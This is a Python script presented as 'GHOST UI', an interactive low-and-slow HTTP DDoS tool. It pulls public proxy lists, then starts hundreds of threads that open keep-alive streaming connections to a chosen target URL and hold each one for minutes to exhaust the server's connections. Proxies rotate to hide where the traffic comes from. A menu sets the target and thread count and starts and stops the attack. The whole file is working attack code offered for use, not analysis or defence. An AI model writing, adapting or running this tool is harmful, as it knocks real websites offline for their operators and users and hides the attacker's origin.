#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
[ G H O S T   U I ]
Advanced Low & Slow DDoS Tool with Interactive Control Panel
Author: Blackhatsense
Description: A stealthy connection exhaustion tool with a full
             interactive menu for configuration and real-time monitoring.
"""

import os
import sys
import time
import random
import threading
import argparse
from urllib.parse import urlparse
import socket

# --- External Libraries ---
try:
    import requests
except ImportError:
    print("[!] 'requests' not found. Install it with: pip3 install requests")
    sys.exit(1)

# --- UI Colors ---
class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# --- Banner ---
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    banner = f"""
{Colors.BOLD}{Colors.CYAN}
╔════════════════════════════════════════════════════════════╗
║                                                              ║
║   {Colors.RED}G H O S T   U I{Colors.CYAN} - Interactive Control Panel           ║
║                                                              ║
║   {Colors.WHITE}Advanced Low & Slow HTTP DDoS Tool{Colors.CYAN}                   ║
║                                                              ║
╚════════════════════════════════════════════════════════════╝
{Colors.RESET}
"""
    print(banner)

# --- Configuration & Proxy Fetcher (Same as before) ---
USER_AGENTS = [ "Mozilla/5.0...", "..." ] # نفس القائمة الكبيمة من السكربت السابق

def get_proxies():
    proxy_sources = [
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
        'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
    ]
    proxies = []
    print(f"{Colors.YELLOW}[*] Fetching proxies...{Colors.RESET}")
    for source in proxy_sources:
        try:
            r = requests.get(source, timeout=10)
            if r.status_code == 200:
                found = [line.strip() for line in r.text.splitlines() if ':' in line]
                proxies.extend(found)
        except Exception: pass
    proxies = list(set(proxies))
    print(f"{Colors.GREEN}[+] Total unique proxies: {len(proxies)}{Colors.RESET}")
    return proxies

# --- The Core Attack Class (Slightly Modified for UI integration) ---
class PhantomCrawler:
    def __init__(self, target_url, proxies, threads):
        self.target_url = target_url
        self.parsed_url = urlparse(target_url)
        self.host = self.parsed_url.netloc
        self.proxies = proxies
        self.threads = threads
        self.stop_event = threading.Event()
        self.active_connections = 0
        self.lock = threading.Lock()

    def _get_random_proxy(self):
        if not self.proxies: return None
        proxy = random.choice(self.proxies)
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

    def _connection_exhaustion(self):
        while not self.stop_event.is_set():
            proxy_dict = self._get_random_proxy()
            if not proxy_dict: time.sleep(5); continue
            try:
                s = requests.Session()
                s.headers.update({"User-Agent": random.choice(USER_AGENTS), "Connection": "keep-alive"})
                response = s.get(self.target_url, stream=True, timeout=15, proxies=proxy_dict)
                with self.lock: self.active_connections += 1
                response.raw.read(1)
                time.sleep(random.randint(120, 300))
                response.close(); s.close()
                with self.lock: self.active_connections -= 1
            except Exception:
                with self.lock: self.active_connections -= 1
                time.sleep(5)

    def start(self):
        if not self.proxies: return
        for _ in range(self.threads):
            t = threading.Thread(target=self._connection_exhaustion)
            t.daemon = True
            t.start()

    def stop(self):
        self.stop_event.set()

# --- The Interactive Menu System ---
class GhostUI:
    def __init__(self):
        self.target_url = ""
        self.threads = 200
        self.proxies = []
        self.attacker = None
        self.attack_thread = None

    def show_menu(self):
        clear_screen()
        show_banner()
        
        # Display Status
        status_color = Colors.GREEN if self.attacker and self.attacker.stop_event.is_set() == False else Colors.RED
        status_text = "RUNNING" if self.attacker and self.attacker.stop_event.is_set() == False else "STOPPED"
        print(f"{Colors.BOLD}--- Status ---{Colors.RESET}")
        print(f"Attack Status: {status_color}{status_text}{Colors.RESET}")
        if self.attacker:
            with self.attacker.lock:
                print(f"Active Connections: {Colors.YELLOW}{self.attacker.active_connections}{Colors.RESET}")
        print("-" * 20)
        
        # Display Configuration
        print(f"{Colors.BOLD}--- Configuration ---{Colors.RESET}")
        print(f"Target URL: {Colors.CYAN}{self.target_url or 'Not Set'}{Colors.RESET}")
        print(f"Threads: {Colors.CYAN}{self.threads}{Colors.RESET}")
        print(f"Proxies: {Colors.CYAN}{len(self.proxies)}{Colors.RESET}")
        print("-" * 20)
        
        # Display Options
        print(f"{Colors.BOLD}--- Menu ---{Colors.RESET}")
        print("1. Set Target URL")
        print("2. Set Number of Threads")
        print("3. Fetch/Refresh Proxies")
        print("4. Start Attack")
        print("5. Stop Attack")
        print("6. Exit")
        print("-" * 20)
        
        choice = input(f"{Colors.GREEN}ghost_ui>{Colors.RESET} ")
        self.handle_choice(choice)

    def handle_choice(self, choice):
        if choice == '1':
            url = input("Enter target URL (e.g., https://example.com): ")
            if urlparse(url).scheme in ['http', 'https']:
                self.target_url = url
                print(f"{Colors.GREEN}[+] Target set to: {self.target_url}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[-] Invalid URL format.{Colors.RESET}")
            input("Press Enter to continue...")

        elif choice == '2':
            try:
                t = int(input("Enter number of threads (e.g., 200): "))
                if t > 0:
                    self.threads = t
                    print(f"{Colors.GREEN}[+] Threads set to: {self.threads}{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[-] Threads must be a positive number.{Colors.RESET}")
            except ValueError:
                print(f"{Colors.RED}[-] Invalid input.{Colors.RESET}")
            input("Press Enter to continue...")

        elif choice == '3':
            self.proxies = get_proxies()
            input("Press Enter to continue...")

        elif choice == '4':
            if not self.target_url:
                print(f"{Colors.RED}[-] Target URL is not set. Please set it first.{Colors.RESET}")
                input("Press Enter to continue...")
                return
            if not self.proxies:
                print(f"{Colors.RED}[-] No proxies fetched. Please fetch them first.{Colors.RESET}")
                input("Press Enter to continue...")
                return
            if self.attacker and not self.attacker.stop_event.is_set():
                print(f"{Colors.YELLOW}[*] Attack is already running.{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            print(f"{Colors.YELLOW}[*] Initializing attack...{Colors.RESET}")
            self.attacker = PhantomCrawler(self.target_url, self.proxies, self.threads)
            self.attack_thread = threading.Thread(target=self.attacker.start)
            self.attack_thread.start()
            print(f"{Colors.GREEN}[+] Attack started on {self.target_url}{Colors.RESET}")
            time.sleep(2)

        elif choice == '5':
            if self.attacker and not self.attacker.stop_event.is_set():
                print(f"{Colors.YELLOW}[*] Stopping attack...{Colors.RESET}")
                self.attacker.stop()
                # Wait for the attack thread to finish
                if self.attack_thread.is_alive():
                    self.attack_thread.join()
                print(f"{Colors.GREEN}[+] Attack stopped.{Colors.RESET}")
                self.attacker = None # Reset attacker instance
            else:
                print(f"{Colors.RED}[-] No active attack to stop.{Colors.RESET}")
            input("Press Enter to continue...")
            
        elif choice == '6':
            if self.attacker and not self.attacker.stop_event.is_set():
                print(f"{Colors.YELLOW}[*] Stopping active attack before exiting...{Colors.RESET}")
                self.attacker.stop()
                if self.attack_thread.is_alive():
                    self.attack_thread.join()
            print(f"{Colors.BOLD}{Colors.CYAN}Exiting Ghost UI. Goodbye.{Colors.RESET}")
            sys.exit(0)
            
        else:
            print(f"{Colors.RED}[-] Invalid choice. Please try again.{Colors.RESET}")
            time.sleep(1)

    def run(self):
        # Initial proxy fetch
        self.proxies = get_proxies()
        while True:
            try:
                self.show_menu()
            except KeyboardInterrupt:
                self.handle_choice('6') # Treat Ctrl+C as Exit

# --- Main Execution ---
def main():
    if os.name == 'nt':
        print(f"{Colors.YELLOW}[-] This script is best run on a Linux VPS for optimal performance.{Colors.RESET}")
    ui = GhostUI()
    ui.run()

if __name__ == "__main__":
    main()
